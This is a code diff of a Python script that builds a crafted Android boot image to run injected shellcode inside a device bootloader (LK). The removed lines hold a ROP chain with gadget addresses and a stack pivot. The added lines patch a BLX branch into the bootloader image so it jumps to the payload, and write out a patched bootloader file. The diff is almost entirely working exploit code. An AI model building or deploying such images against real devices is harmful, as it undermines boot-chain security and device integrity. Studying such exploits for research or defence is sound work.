@@ -5,18 +5,9 @@ import struct
 base = 0x4BD00000
 forced_addr = 0x45000000
 
-# 61a4d:       bd0b            pop     {r0, r1, r3, pc}
-pop_r0_r1_r3_pc = base + 0x61a4d|1
+page_size = 0x800 # rook forces 0x800 bytes
 
-# 36fe8:       e49df004        pop     {pc}            ; (ldr pc, [sp], #4)
-pop_pc = base + 0x36fe8
-
-# 150:       4798            blx     r3 ;  pop     {r3, pc}
-blx_r3_pop_r3 = base + 0x150|1
-
-cache_func = base + 0x36FD8
-
-test = base + 0x185 # prints "Error, the pointer of pidme_data is NULL."
+patch_offset = 0x1d51c
 
 shellcode_sz = 0x1000 # TODO: check size
 
@@ -27,18 +18,25 @@ inject_offset = lk_offset - shellcode_sz - 0x100
 inject_addr = forced_addr + inject_offset + 0x10
 shellcode_addr = forced_addr + inject_offset + 0x100
 
-# 503f0:       e913e7cd        ldmdb   r3, {r0, r2, r3, r6, r7, r8, r9, sl, sp, lr, pc}
-pivot = base + 0x503F0
+kernel_size = lk_offset + patch_offset + 0x4
+if kernel_size % page_size != 0:
+    kernel_size = ((kernel_size // page_size) + 1) * page_size
+boot_size = kernel_size + (2 * page_size)
 
-ptr_offset = 0x3C0 # to be checked
+def encode_blx(src, dst):
+    # See http://pank4j.github.io/posts/assembling-from-scratch-encoding-blx-instruction-in-arm-thumb.html
+    offset = dst - ((src + 4) & 0xFFFFFFFC)
 
-r3_pc = base + (ptr_offset - 0x18) 
-ptr_pc = base + (ptr_offset - 0x08)
+    s = ((offset >> 24) & 0x1)
+    i1 = ((offset >> 16) & 0x80) >> 7
+    i2 = ((offset >> 16) & 0x40) >> 6
+    h = (offset & 0x3FF000) << 4
+    l = (offset & 0xFFC) >> 1
+    j1 = (1 - i1) ^ s
+    j2 = (1 - i2) ^ s
 
-lk_r3_target = inject_addr + 0x10
-lk_ptr_target = inject_addr + 0x14
-
-page_size = 0x800 # rook forces 0x800 bytes
+    result = 0xF000C000 | (s << 26) | h | (j1 << 13) | (j2 << 11) | l
+    return struct.pack("<HH", result  >> 16, result & 0xFFFF)
 
 def main():
     if len(sys.argv) < 2:
@@ -51,40 +49,12 @@ def main():
         args = sys.argv
 
     with open(args[1], "rb") as fin:
-        orig = fin.read(ptr_offset + 0x200)
-        fin.seek(ptr_offset + 0x200 + 0x8)
-        pad_len = ((len(orig) // 0x800) + 1) * 0x800
-        #orig2 = fin.read(pad_len - len(orig) - 0x8)
-        orig2 = fin.read()
+        orig = fin.read()
 
     hdr = b"ANDROID!"
-    hdr += struct.pack("<II", lk_offset + ptr_offset + 0x8, forced_addr)
-    #hdr += bytes.fromhex("0000000000000044000000000000F0400000004840000000000000002311040E00000000000000000000000000000000")
+    hdr += struct.pack("<II", kernel_size, forced_addr)
     hdr += bytes.fromhex("0000000000000044000000000000F0400000004800080000000000002311040E00000000000000000000000000000000")
     hdr += b"bootopt=64S3,32N2,32N2" # This is so that TZ still inits, but LK thinks kernel is 32-bit - need to fix too!
-    hdr += b"\x00" * 0xA
-    hdr += b"\x00" * (page_size - 0x40)
-    hdr += b"\x00" * inject_offset
-    hdr += struct.pack("<II", inject_addr + 0x40, pivot) # r3, pc (+0x40 because gadget arg points at the end of ldm package)
-    hdr += b"\x00" * 0x1C
-    hdr += struct.pack("<III", inject_addr + 0x50, 0, pop_pc) # sp, lr, pc
-
-    hdr += b"\x00" * (0xC + 0x4)
-
-    # clean dcache, flush icache, then jump to payload
-    chain = [
-        pop_r0_r1_r3_pc,
-        shellcode_addr,                              # r0
-        shellcode_sz,                                # r1
-        cache_func,                                  # r3
-
-        blx_r3_pop_r3,                               # pc
-        0xDEAD,                                      # r3
-
-        shellcode_addr                               # pc
-    ]
-    chain_bin = b"".join([struct.pack("<I", word) for word in chain])
-    hdr += chain_bin
 
     want_len = shellcode_addr - inject_addr + page_size + 0x10
     hdr += b"\x00" * ((want_len + inject_offset) - len(hdr))
@@ -97,13 +67,11 @@ def main():
 
     hdr += shellcode
 
-    payload_block_end = len(hdr)
-
     hdr += b"\x00" * (lk_offset + page_size - len(hdr) - 0x200)
 
-    hdr += orig
-    hdr += struct.pack("<ii", lk_r3_target - r3_pc, lk_ptr_target - ptr_pc)
-    hdr += orig2
+    hdr += orig[:patch_offset + 0x200]
+    hdr += encode_blx(base + patch_offset, shellcode_addr) # blx shellcode_addr
+    hdr += orig[patch_offset + 0x200 + 4:]
 
     payload_block = (inject_offset // 0x200)
     print("Payload Address: " + hex(shellcode_addr))
@@ -120,6 +88,9 @@ def main():
         print("Writing " + args[3] + "...")
         with open(args[3], "wb") as fout:
             fout.write(hdr)
+        print("Writing " + args[3] + ".lk.bin ...")
+        with open(args[3] + ".lk.bin", "wb") as fout:
+            fout.write(hdr[lk_offset + page_size - 0x200:])
 
 
 if __name__ == "__main__":
